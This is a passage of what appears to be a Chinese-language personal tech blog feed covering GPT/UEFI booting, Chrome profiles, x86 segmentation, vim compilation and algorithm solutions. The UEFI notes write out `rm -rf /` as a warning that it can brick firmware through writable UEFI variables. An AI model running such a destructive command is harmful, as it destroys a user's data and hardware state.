href="#Can-a-disk-be-both-GPT-and-MBR" class="headerlink" title="Can a disk be both GPT and MBR?"></a>Can a disk be both GPT and MBR?</h5><p>No. However, all GPT disks contain a Protective MBR.</p><h5 id="What-is-a-Protective-MBR"><a href="#What-is-a-Protective-MBR" class="headerlink" title="What is a Protective MBR?"></a>What is a Protective MBR?</h5><p>The Protective MBR, beginning in sector 0, precedes the GPT partition table on the disk. The MBR contains one type 0xEE partition that spans the disk.</p><h5 id="Why-does-the-GPT-have-a-Protective-MBR"><a href="#Why-does-the-GPT-have-a-Protective-MBR" class="headerlink" title="Why does the GPT have a Protective MBR?"></a>Why does the GPT have a Protective MBR?</h5><p>The Protective MBR protects GPT disks from previously released MBR disk tools such as Microsoft MS-DOS FDISK or Microsoft Windows NT Disk Administrator. These tools are not aware of GPT and don’t know how to properly access a GPT disk. Legacy software that does not know about GPT interprets only the Protected MBR when it accesses a GPT disk. These tools will view a GPT disk as having a single encompassing (possibly unrecognized) partition by interpreting the Protected MBR, rather than mistaking the disk for one that is unpartitioned.</p><h5 id="Why-would-a-GPT-partitioned-disk-appear-to-have-an-MBR-on-it"><a href="#Why-would-a-GPT-partitioned-disk-appear-to-have-an-MBR-on-it" class="headerlink" title="Why would a GPT-partitioned disk appear to have an MBR on it?"></a>Why would a GPT-partitioned disk appear to have an MBR on it?</h5><p>This occurrs when you use an MBR-only-aware disk tool to access the GPT disk.</p></blockquote></li><li><p>如果没有保护性的MBR，一些MBR-only的工具可能会认为该磁盘没有格式化所以去格式化该磁盘</p></li><li><p>不要使用不支持GPT的分区工具，这些工具会认为自己理解了磁盘布局，其实并没有。这是很危险的。</p></li></ul><h3 id="ESP"><a href="#ESP" class="headerlink" title="ESP"></a>ESP</h3><ul><li><blockquote><p>The <a href="https://en.wikipedia.org/wiki/EFI_system_partition" target="_blank" rel="noopener">EFI system partition</a> (also called ESP or EFISYS) is an OS independent partition that acts as the storage place for the EFI bootloaders, applications and drivers to be launched by the UEFI firmware. It is mandatory for UEFI boot.</p><p>The UEFI specification mandates support for the FAT12, FAT16, and FAT32 filesystems (see <a href="http://www.uefi.org/sites/default/files/resources/UEFI%20Spec%202_7_A%20Sept%206.pdf#G17.1019485" target="_blank" rel="noopener">UEFI specification version 2.7, section 13.3.1.1</a>), but any conformant vendor can optionally add support for additional filesystems; for example, Apple <a href="https://wiki.archlinux.org/index.php/Mac" target="_blank" rel="noopener">Macs</a> support (and by default use) their own HFS+ filesystem drivers.</p></blockquote></li><li><p>因为这只是一个普通的FAT分区，所以可以被操作系统挂载、读写。</p></li><li><blockquote><p>At boot time, the firmware consults the GPT partition table to identify the ESP. It then reads the configured target application directly from a file in the ESP and executes it.</p></blockquote></li></ul><h3 id="BOOT"><a href="#BOOT" class="headerlink" title="BOOT"></a>BOOT</h3><ul><li><p>没有boot block（除了Protective MBR）</p></li><li><p>在UEFI 系统，并不需要boot loader，UEFI boot target 可以是UNIX/Linux kernel，这些kernel可以被配置为direct UEFI loading。不过，实践中，为了兼容legacy BIOSes，所以还是使用了boot loader</p></li><li><p>在modern intel system，UEFI默认从<code>/efi/boot/boot64.efi</code>加载。这个路径可以作为一个参数配置</p></li><li><p>UEFI定义了很多访问系统硬件的API，在这个意义上，其已经是一个小型操作系统了，甚至有UEFI-level add-on device drivers（使用处理器无关的语言编写，存储在ESP）。操作系统可以使用这些API访问硬件，也可以直接控制硬件。</p></li><li><p>因为UEFI有formal API，所以可以在运行的操作系统修改UEFI 变量</p></li><li><p>firmware可以被mounted read/write（从可以修改UEFI变量就可以知道确实可读写）</p></li><li><p>在那些默认允许写的系统(typically, those with systemd)，<code>rm -rf /</code> 可以永久的摧毁system at fireware level。并且，除了移除文件，rm还移除variables and other UEFI information accessible through <code>/sys</code></p><p>​</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Legacy-BIOS&quot;&gt;&lt;a href=&quot;#Legacy-BIOS&quot; class=&quot;headerlink&quot; title=&quot;Legacy BIOS&quot;&gt;&lt;/a&gt;Legacy BIOS&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;传统的bios假设boot device start w
      
    
    </summary>
    
      <category term="运维" scheme="https://h-zex.github.io/categories/%E8%BF%90%E7%BB%B4/"/>
    
    
      <category term="boot" scheme="https://h-zex.github.io/tags/boot/"/>
    
      <category term="unix/linux" scheme="https://h-zex.github.io/tags/unix-linux/"/>
    
  </entry>
  
  <entry>
    <title>How to Have Two Chromes at Linux</title>
    <link href="https://h-zex.github.io/2018/09/10/How-to-Have-Two-Chromes-at-Linux/"/>
    <id>https://h-zex.github.io/2018/09/10/How-to-Have-Two-Chromes-at-Linux/</id>
    <published>2018-09-10T13:26:34.000Z</published>
    <updated>2018-09-10T13:56:04.298Z</updated>
    
    <content type="html"><![CDATA[<h3 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h3><ul><li>由于Tampermonkey的脚本频繁更新，所以有点担心脚本的安全性问题。毕竟没有时间把源码都看一遍。</li><li>而由于JavaScript的能力比较有限，所以，我认为，构造一个新的浏览器环境来运行这个脚本应该就可以解决问题。</li><li>那么，就需要两个chrome的环境</li></ul><h3 id="chrome的用户数据"><a href="#chrome的用户数据" class="headerlink" title="chrome的用户数据"></a>chrome的用户数据</h3><ul><li>linux下chrome的默认用户数据存储在<code>/home/&lt;user-name&gt;/.config/google-chrome</code>，可以使用<code>--user-data-dir=DIR</code>参数启动chrome来使得chrome使用另一个目录作为用户data目录<blockquote><p>–user-data-dir=DIR<br>Specifies the directory that user data (your “profile”) is kept in.  Defaults to $HOME/.config/google-chrome .  Separate instances of  Google<br>Chrome  must  use  separate user data directories; repeated invocations of google-chrome will reuse an existing process for a given user data<br>directory.</p></blockquote></li><li><p>接下来</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /home/&lt;user-name&gt;/.config/</span><br><span class="line">mv google-chrome xxx </span><br><span class="line"><span class="meta">#</span> 注意，不可以使用google-chrome.old，否则chrome还是会从这个文件夹获得用户名等信息</span><br><span class="line"><span class="meta">#</span> 我就是使用了google-chrome.old，结果打开新的chrome，chrome总是显示我已经登录了，然后新的google-chrome目录下的生成的新的Local State文件总是有我的个人信息</span><br></pre></td></tr></table></figure><p> 接下来，打开chrome（不加–user-data-dir参数），chrome就会生成新的google-chrome文件夹，从而就可以获得一个全新的chrome环境。然后安装需要的插件和脚本（注意，不要登录账户然后选同步设置。）</p></li><li>把chrome新创建的这个google-chrome文件夹名改为自己要的名字，然后以后要使用新环境就直接加上<code>--user-data-dir=DIR</code>参数打开chrome即可</li><li>由于chrome的用户data似乎对chrome版本比较敏感，所以还需要其他措施（当然没有似乎问题也不大——我67使用69的配置只是报个错，没有其他问题）</li></ul><h3 id="从chrome-的deb解压获得chrome从而不需要安装也可以使用chrome"><a href="#从chrome-的deb解压获得chrome从而不需要安装也可以使用chrome" class="headerlink" title="从chrome 的deb解压获得chrome从而不需要安装也可以使用chrome"></a>从chrome 的deb解压获得chrome从而不需要安装也可以使用chrome</h3><ul><li><code>dpkg -x xxx.deb folder</code>即可把deb包解压到folder文件夹中</li><li>然后使用使用<code>chown</code>命令修改<code>folder/opt/google/chrome/chrome-sandbox</code>的拥有者为root，然后使用<code>chmod 4755</code>修改该文件的权限，才可以使用这个chrome</li><li>使用方法，直接在<code>folder/opt/google/chrome/</code>目录下运行<code>./chrome</code>即可</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;需求&quot;&gt;&lt;a href=&quot;#需求&quot; class=&quot;headerlink&quot; title=&quot;需求&quot;&gt;&lt;/a&gt;需求&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;由于Tampermonkey的脚本频繁更新，所以有点担心脚本的安全性问题。毕竟没有时间把源码都看一遍。&lt;/li&gt;
&lt;li&gt;而由于
      
    
    </summary>
    
      <category term="运维" scheme="https://h-zex.github.io/categories/%E8%BF%90%E7%BB%B4/"/>
    
    
      <category term="运维" scheme="https://h-zex.github.io/tags/%E8%BF%90%E7%BB%B4/"/>
    
      <category term="小技巧" scheme="https://h-zex.github.io/tags/%E5%B0%8F%E6%8A%80%E5%B7%A7/"/>
    
      <category term="chrome" scheme="https://h-zex.github.io/tags/chrome/"/>
    
      <category term="linux" scheme="https://h-zex.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>LeetCode 11.Container With Most Water</title>
    <link href="https://h-zex.github.io/2018/08/04/LeetCode-11-Container-With-Most-Water/"/>
    <id>https://h-zex.github.io/2018/08/04/LeetCode-11-Container-With-Most-Water/</id>
    <published>2018-08-04T04:48:35.594Z</published>
    <updated>2018-08-04T04:48:35.594Z</updated>
    
    <content type="html"><![CDATA[<h2 id="O-NlgN-解法"><a href="#O-NlgN-解法" class="headerlink" title="$O(NlgN)$解法"></a>$O(NlgN)$解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 思路：</span></span><br><span class="line"><span class="comment"> * 对于第i根柱子，求出它左边比他高或者相同高度的柱子中最远的那根的位置</span></span><br><span class="line"><span class="comment"> * 方法是递推</span></span><br><span class="line"><span class="comment"> * 首先，map是红黑树实现的，所以其是有序的</span></span><br><span class="line"><span class="comment"> * 然后，每次求出第i根柱子后，把 &lt;height[i], &lt;i, result&gt;&gt; push到map里</span></span><br><span class="line"><span class="comment"> * 可以从map中取出已经加进map的（也就是在第i根柱子左边的柱子）中，height</span></span><br><span class="line"><span class="comment"> * 刚好大于或者等于height[i]的，设为p，然后，柱子p的result就是柱子i的result</span></span><br><span class="line"><span class="comment"> * 反证法：假设不是，而是q，那么q应当是大于等于p并且在p的左边——否则i的result就还是p，因为p更左边。</span></span><br><span class="line"><span class="comment"> * 既然q大于等于p并且在左边，那么p的result应该是q</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line">  <span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; PII;</span><br><span class="line">    <span class="built_in">multimap</span>&lt;<span class="keyword">int</span>, PII, greater&lt;<span class="keyword">int</span>&gt;&gt; tree;</span><br><span class="line">    <span class="built_in">multimap</span>&lt;<span class="keyword">int</span>, PII, greater&lt;<span class="keyword">int</span>&gt;&gt; rtree;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">ct</span><span class="params">(<span class="keyword">const</span> <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp;height)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> it = height.begin(); it != height.end(); ++it, ++i) &#123;</span><br><span class="line">            <span class="keyword">auto</span> p = tree.insert(pair&lt;<span class="keyword">int</span>, PII&gt;(*it, PII(i, i)));</span><br><span class="line">            <span class="keyword">if</span> (p != tree.begin()) &#123;</span><br><span class="line">                <span class="keyword">auto</span> k = (--p)-&gt;second;</span><br><span class="line">                (++p)-&gt;second = PII(i, k.second);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">crt</span><span class="params">(<span class="keyword">const</span> <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp;height)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i = height.size();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> it = height.rbegin(); it != height.rend(); ++it, --i) &#123;</span><br><span class="line">            <span class="keyword">auto</span> p = rtree.insert(pair&lt;<span class="keyword">int</span>, PII&gt;(*it, PII(i, i)));</span><br><span class="line">            <span class="keyword">if</span> (p != rtree.begin()) &#123;</span><br><span class="line">                <span class="keyword">auto</span> k = (--p)-&gt;second;</span><br><span class="line">                (++p)-&gt;second = PII(i, k.second);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxArea</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp;height)</span> </span>&#123;</span><br><span class="line">        ct(height);</span><br><span class="line">        crt(height);</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> it = tree.begin(); it != tree.end(); ++it) &#123;</span><br><span class="line">            <span class="keyword">int</span> p = (it-&gt;first) * (it-&gt;second.first - it-&gt;second.second);</span><br><span class="line">            ans = ans &lt; p ? p : ans;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> it = rtree.begin(); it != rtree.end(); ++it) &#123;</span><br><span class="line">            <span class="keyword">int</span> p = (it-&gt;first) * (it-&gt;second.second - it-&gt;second.first);</span><br><span class="line">            ans = ans &lt; p ? p : ans;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      solution
    
    </summary>
    
      <category term="算法" scheme="https://h-zex.github.io/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="ACM" scheme="https://h-zex.github.io/tags/ACM/"/>
    
      <category term="Leetcode" scheme="https://h-zex.github.io/tags/Leetcode/"/>
    
  </entry>
  
  <entry>
    <title>打印自身的图灵机的构造</title>
    <link href="https://h-zex.github.io/2018/08/03/%E6%89%93%E5%8D%B0%E8%87%AA%E8%BA%AB%E7%9A%84%E5%9B%BE%E7%81%B5%E6%9C%BA%E7%9A%84%E6%9E%84%E9%80%A0/"/>
    <id>https://h-zex.github.io/2018/08/03/打印自身的图灵机的构造/</id>
    <published>2018-08-03T03:16:51.000Z</published>
    <updated>2018-08-04T04:48:35.596Z</updated>
    
    <content type="html"><![CDATA[<ul><li><p>以下是<em>Introduction to The Theory of Computation</em> 英文第三版的Lemma6.1、Theory6.3的个人理解 </p></li><li><p>下文中，<code>&lt;p&gt;</code> 代表图灵机p的编码</p></li></ul><ul><li>首先，根据Lemma6.1，可以有一台通用机器q，其对于任意w，打印出“输出该w的图灵机”的编码——不过并不保证这台被打印出的图灵机就是那一台生成该w的图灵机——生成w的图灵机可以有很多台，q只打印出其中一台</li><li>然后，利用上面这个东西，就可以<strong>特殊构造</strong>某机器p，其输出w，并且该机器的编码就是q输出的图灵机的编码。从而使得q从p的输出w可以反推出p本身</li><li>然后，再特殊一点，这台p输出的w刚好就是q的编码——这是可以做到的，因为q是一台已经确定的，独立于p的图灵机。那么，q的输出+p的输出就刚好是<code>&lt;p&gt;&lt;q&gt;</code> ——从而，q与p组合起来的图灵机就是一台打印出自身的图灵机</li><li>继续扩展，p可以有多部分构成，使得p和q组合起来的机器不仅仅打印出自身，还可以做其他事情。比如说，p=ab，其中a是打印出<code>&lt;q&gt;&lt;b&gt;</code> 的图灵机，b是做其他事情的图灵机。然后，图灵机q就可以打印出图灵机p。如果把他们的输出组合起来就成了<code>&lt;p&gt;&lt;q&gt;&lt;b&gt;</code> 。当图灵机a、图灵机q运行完之后，纸带上就有了<code>&lt;p&gt;&lt;q&gt;&lt;b&gt;</code> 。consider that，必然是p先运行，在纸带上留下自己的输出，然后才能q运行，从纸带上获得p的输出，来产生出<code>&lt;p&gt;</code> 。可以修改q，使得其运行后，把控制权交给图灵机b，然后图灵机b从纸带上获得<code>&lt;p&gt;&lt;q&gt;&lt;b&gt;</code> ，继续执行计算。</li><li>上文说的转交控制权的可以这样实现——根据图灵机b定制图灵机q，使得q的accept状态后读入空串到达图灵机b的其实状态。这时候，图灵机q的编码将依赖于图灵机b。</li><li>更进一步，再修改图灵机q，其不是使用图灵机p的所有输出，而是使用图灵机p的一部分输出来构造出<code>&lt;p&gt;</code> ，那么，图灵机p就不仅仅可以输出图灵机q的描述，还可以在纸带上留下w（w与<code>&lt;p&gt;&lt;q&gt;</code> 无关）。</li><li>那么，我们就可以有一台图灵机M，其由图灵机p、q组成，其中，p=ab，那么，这台图灵机会在q运行完后，在纸带上留下<code>w&lt;p&gt;&lt;q&gt;&lt;b&gt;</code> 。然后，将控制权转给图灵机b，其执行其他计算。从而，我们的这台图灵机M其不仅仅打印出自身，还实现了图灵机b的功能。</li></ul>]]></content>
    
    <summary type="html">
    
      打印自身的图灵机的构造
    
    </summary>
    
      <category term="计算理论" scheme="https://h-zex.github.io/categories/%E8%AE%A1%E7%AE%97%E7%90%86%E8%AE%BA/"/>
    
    
      <category term="图灵机" scheme="https://h-zex.github.io/tags/%E5%9B%BE%E7%81%B5%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>Segmentation 分段</title>
    <link href="https://h-zex.github.io/2018/06/30/Segmentation-%E5%88%86%E6%AE%B5/"/>
    <id>https://h-zex.github.io/2018/06/30/Segmentation-分段/</id>
    <published>2018-06-30T05:09:58.000Z</published>
    <updated>2018-09-04T12:08:58.871Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>以下内容是对mit6.828 xv6book、pcasm-book、cmu 15-410关于segment的doc的整理</p><p><a href="https://pdos.csail.mit.edu/6.828/2017/xv6/book-rev10.pdf" target="_blank" rel="noopener">xv6book</a>, <a href="https://pdos.csail.mit.edu/6.828/2017/readings/pcasm-book.pdf" target="_blank" rel="noopener">PC Assembly Language</a>, <a href="https://www.cs.cmu.edu/~410/doc/segments/segments.html" target="_blank" rel="noopener">CMU-15-410 segment </a></p></blockquote><blockquote><p>在分段中，寻址使用的是一个 <code>&lt;selector, offset&gt;</code> 的pair</p></blockquote><h4 id="real-mode"><a href="#real-mode" class="headerlink" title="real mode"></a>real mode</h4><ul><li><p>selector 保存在segment register，这是一个paragraph number。</p></li><li><blockquote><p>内存单元常常以多个byte为单元一起使用，比如，两个byte是word，4个是double word，8个是quad word，16个则是paragraph</p></blockquote></li><li><p>segmentation hardware（也就是那个进行段转换的机构）直接把selector的值乘以16然后加上offset的值得到physical address</p></li></ul><h4 id="16-bit-protected-mode"><a href="#16-bit-protected-mode" class="headerlink" title="16-bit protected mode"></a>16-bit protected mode</h4><ul><li><p>selector 同样保存在segment register中，不过现在不是单纯的paragraph number，而是包含一组信息：a segment number, a table selector flag, a request privilege level。 </p><img src="/2018/06/30/Segmentation-分段/1.gif"><p>segment number是到GDT（global decriptor table）或者LDT（local decriptor table）的index（数组下标称为array index，所以这个index就是类似数组下标的东西）。</p><p>table selector flag指示的是segment number使用的是GDT还是LDT的index</p><p>RPL（request privilege level）对于不同的段寄存器有不同的含义。对于cs寄存器，RPL设置处理器的特权级</p><blockquote><p> In this case (the %CS register), the RPL sets the privilege level of the processor</p></blockquote><p>不过，在mit 6.828的那本xv6book的Appendix B中有一幅图</p><img src="/2018/06/30/Segmentation-分段/2.png"><p>其中使用16bit的selector直接作为GDT/LDT的index，所以，这地方有一些疑点</p></li><li><p>GDT/LDT的descriptor包含base address、size和一些flag bits、privilege level，当访问内存时，处理器将offset与size相比较，如果offset&gt;= size ，则是越界访问。如果是合法的访问，则base address + offset得到 linear address</p></li></ul><h4 id="32-bit-protected-mode"><a href="#32-bit-protected-mode" class="headerlink" title="32-bit protected mode"></a>32-bit protected mode</h4><ul><li><p>80386 引入了32-bit protected mode，这个模式相对于16-bit的保护模式有两个区别——offset现在是32bit，segment 现在被切分成4K-sized 的unit，称为page。</p></li><li><p>解释一下整个地址转换流程。logical address（或者叫 virtual address） 就是<code>&lt;selector, offset&gt;</code> ，linear address就是selector 和 offset 经过segment translation 转换后得到的地址。如果没有开paging hardware，那么，linear address就直接作为physical address使用。如果有，则要查页表</p><img src="/2018/06/30/Segmentation-分段/3.png"></li></ul><h4 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h4><ul><li><p>可以使用一些方法使得分段实际上跟没有起作用一样。</p></li><li><p>比如，所有的descriptor中base address都是0x00000000，size都是0xFFFFFFFF（假设是在32位的机器上），那么，segment translation的越界检查、$offset+base size * 16$ 实际上等价于无用功。所以看起来跟flat address space一样的</p></li><li><p>在xv6的boot过程中，实际上paging hardware、segmentation hardware并没有起作用</p><blockquote><p>The boot loader does not enable the paging hardware; the logical addresses that it uses are translated to linear addresses by the segmentation harware, and then used directly as physical addresses. Xv6 configures the segmentation hardware to translate logical to linear addresses without change, so that they are always equal.</p></blockquote></li><li><p>逻辑地址segmen:offset 可以得出21bit的physical address（0xffff0+0xffff=0x10ffef），但是intel 8088把第21bit直接丢掉。所以为了兼容性，虽然后面的intel cpu可以支持21bit的地址，IBM还是提供了一个向后兼容。<a href="https://wiki.osdev.org/A20_Line" target="_blank" rel="noopener">A20 Line wiki</a></p><blockquote><p>If the second bit of the keyboard controller’s output port is low, the 21st physical address bit is always cleared; if high, the 21st bit acts normally. The boot loader must enable the 21st address bit using I/O to the keyboard controller on ports 0x64 and 0x60<br>The traditional method for A20 line enabling is to directly probe the keyboard controller. The reason for this is that Intel’s 8042 keyboard controller had a spare pin which they decided to route the A20 line through. This seems foolish now given their unrelated nature, but at the time computers weren’t quite so standardized. Keyboard controllers are usually derivatives of the 8042 chip. By programming that chip accurately, you can either enable or disable bit #20 on the address bus.<br>When your PC boots, the A20 gate is always disabled, but some BIOSes do enable it for you, as do some high-memory managers (HIMEM.SYS) or bootloaders (GRUB).</p></blockquote></li></ul>]]></content>
    
    <summary type="html">
    
      MIT 6.828, CMU 15-410 关于segmentation的资料的整理
    
    </summary>
    
      <category term="OS" scheme="https://h-zex.github.io/categories/OS/"/>
    
    
      <category term="MIT 6.828" scheme="https://h-zex.github.io/tags/MIT-6-828/"/>
    
      <category term="OS" scheme="https://h-zex.github.io/tags/OS/"/>
    
  </entry>
  
  <entry>
    <title>vim 不支持系统剪切板的解决方案</title>
    <link href="https://h-zex.github.io/2018/06/05/vim%E4%B8%8D%E6%94%AF%E6%8C%81%E7%B3%BB%E7%BB%9F%E5%89%AA%E5%88%87%E6%9D%BF%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
    <id>https://h-zex.github.io/2018/06/05/vim不支持系统剪切板的解决方案/</id>
    <published>2018-06-05T07:15:31.000Z</published>
    <updated>2018-08-04T04:48:35.569Z</updated>
    
    <content type="html"><![CDATA[<h3 id="判断vim是否支持系统剪切板"><a href="#判断vim是否支持系统剪切板" class="headerlink" title="判断vim是否支持系统剪切板"></a>判断vim是否支持系统剪切板</h3><ul><li><p>在终端输入<code>vim -version</code>，如果<code>clipboard</code> 那一项是<code>-clipboard</code> ，以及<code>xterm_clipboard</code> 那一项是<code>-xterm_clipboard</code> ，说明并不支持。可以通过重新编译来解决</p></li><li><p>以下引用另一位博主的解决方案，<a href="https://www.evernote.com/shard/s258/sh/8f17d13f-5040-45b4-a312-294ef7304fe5/c0c182567f72325da680fb38d66436ae" target="_blank" rel="noopener">原文地址</a></p></li><li><blockquote><p>+clipboard +xterm_clipboard</p><p>solution:</p><p>–with-x –x-includes=/usr/include/X11 –x-libraries=/usr/lib/X11</p><p>You’ll need to install the appropriate X development library like <code>xlib</code> and <code>xtst</code> for <code>--with-x</code> to work. On ubuntu it should be enough to install <code>libx11-dev</code> and <code>libxtst-dev</code>., xlibs-dev</p><p>and   sudo apt-get build-dep vim-gtk </p></blockquote></li><li><p>编译方法，在github vim 主页下载源码zip包，解压后进入第一层目录，执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">./configure \</span><br><span class="line">--enable-cscope \</span><br><span class="line">--with-x --x-includes=/usr/include/X11 --x-libraries=/usr/lib/X11 \</span><br><span class="line">--with-features=normal \</span><br><span class="line">--enable-multibyte \</span><br><span class="line">--enable-rubyinterp \</span><br><span class="line">--enable-pythoninterp \</span><br><span class="line">--with-python-config-dir=/usr/lib/python2.7/config-x86_64-linux-gnu \</span><br><span class="line">--enable-perlinterp \</span><br><span class="line">--enable-luainterp \</span><br><span class="line">--enable-gui=gtk2 --enable-cscope --prefix=/usr</span><br><span class="line"> make &amp;&amp; sudo make install</span><br></pre></td></tr></table></figure><p>上面的配置选项可以根据自己的需求修改</p><p>完成后可以在<code>src/auto/config.log</code> 查看log</p></li></ul>]]></content>
    
    <summary type="html">
    
      vim 不支持系统剪切板的解决方案
    
    </summary>
    
      <category term="运维" scheme="https://h-zex.github.io/categories/%E8%BF%90%E7%BB%B4/"/>
    
    
      <category term="vim" scheme="https://h-zex.github.io/tags/vim/"/>
    
      <category term="系统剪切板" scheme="https://h-zex.github.io/tags/%E7%B3%BB%E7%BB%9F%E5%89%AA%E5%88%87%E6%9D%BF/"/>
    
      <category term="clipboard" scheme="https://h-zex.github.io/tags/clipboard/"/>
    
      <category term="xterm_clipboard" scheme="https://h-zex.github.io/tags/xterm-clipboard/"/>
    
  </entry>
  
  <entry>
    <title>洛谷2577 午餐</title>
    <link href="https://h-zex.github.io/2018/05/20/%E6%B4%9B%E8%B0%B72577-%E5%8D%88%E9%A4%90/"/>
    <id>https://h-zex.github.io/2018/05/20/洛谷2577-午餐/</id>
    <published>2018-05-20T00:20:06.000Z</published>
    <updated>2018-08-04T04:48:35.571Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p>上午的训练结束了，THU ACM小组集体去吃午餐，他们一行N人来到了著名的十食堂。这里有两个打饭的窗口，每个窗口同一时刻只能给一个人打饭。由于每个人的口味（以及胃口）不同，所以他们要吃的菜各有不同，打饭所要花费的时间是因人而异的。另外每个人吃饭的速度也不尽相同，所以吃饭花费的时间也是可能有所不同的。</p><p>THU ACM小组的吃饭计划是这样的：先把所有的人分成两队，并安排好每队中各人的排列顺序，然后一号队伍到一号窗口去排队打饭，二号队伍到二号窗口去排队打饭。每个人打完饭后立刻开始吃，所有人都吃完饭后立刻集合去六教地下室进行下午的训练。</p><p>现在给定了每个人的打饭时间和吃饭时间，要求安排一种最佳的分队和排队方案使得所有人都吃完饭的时间尽量早。</p><p>假设THU ACM小组在时刻0到达十食堂，而且食堂里面没有其他吃饭的同学（只有打饭的师傅）。每个人必须而且只能被分在一个队伍里。两个窗口是并行操作互不影响的，而且每个人打饭的时间是和窗口无关的，打完饭之后立刻就开始吃饭，中间没有延迟。</p><p>现在给定N个人各自的打饭时间和吃饭时间，要求输出最佳方案下所有人吃完饭的时刻。</p><h4 id="输入输出格式"><a href="#输入输出格式" class="headerlink" title="输入输出格式"></a>输入输出格式</h4><p>输入格式：</p><p>第一行一个整数N，代表总共有N个人。</p><p>以下N行，每行两个整数 Ai，Bi。依次代表第i个人的打饭时间和吃饭时间。</p><p>输出格式：</p><p>一个整数T，代表所有人吃完饭的最早时刻。</p><h4 id="输入输出样例"><a href="#输入输出样例" class="headerlink" title="输入输出样例"></a>输入输出样例</h4><p>输入样例#1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">5</span><br><span class="line">2 2</span><br><span class="line">7 7</span><br><span class="line">1 3</span><br><span class="line">6 4</span><br><span class="line">8 5</span><br></pre></td></tr></table></figure><p>输出样例#1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">17</span><br></pre></td></tr></table></figure><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h4 id="吃饭时间越长越早排队"><a href="#吃饭时间越长越早排队" class="headerlink" title="吃饭时间越长越早排队"></a>吃饭时间越长越早排队</h4><ul><li>假设有一个最优分组方法，其中第一队内是按吃饭时间长短排序的——越长排在越前。然后尝试交换该队内的某两个人，<code>i</code>、<code>j</code> ——即原先是<code>i</code> 